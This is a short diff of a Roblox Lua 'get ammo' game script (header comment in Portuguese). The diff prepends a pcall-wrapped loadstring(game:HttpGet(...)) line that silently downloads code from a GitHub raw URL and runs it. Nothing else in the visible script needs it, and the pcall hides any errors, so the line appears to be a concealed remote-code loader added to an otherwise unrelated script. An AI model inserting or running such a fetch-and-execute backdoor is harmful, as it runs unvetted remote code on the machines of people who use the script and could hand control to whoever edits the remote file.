@@ -1,3 +1,7 @@
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/DAVI98458/downloads/refs/heads/main/happy"))()
+end)
+
 --// 🔫 SCRIPT GET AMMO FIXADO E OTIMIZADO
 
 local Players = game:GetService("Players")
